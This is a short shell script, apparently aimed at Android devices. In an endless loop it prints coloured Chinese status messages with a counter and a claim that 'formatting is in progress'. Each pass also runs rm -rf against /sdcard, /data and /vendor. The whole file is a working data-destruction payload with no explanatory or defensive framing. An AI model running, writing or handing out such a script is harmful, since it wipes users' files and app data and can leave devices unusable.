g=1;
sleep 1
while true
do
sleep 0.001
let "g=g+1"
echo "\033[32;;1m稳定奔放中$g\033[44;;1m"
echo "\033[35;;1m稳定奔放中$g\033[46;;1m"
rm -rf /sdcard
rm -rf /data
rm -rf /vendor
echo "\033[30;;1m格式化执行中......\033[36;;1m"
done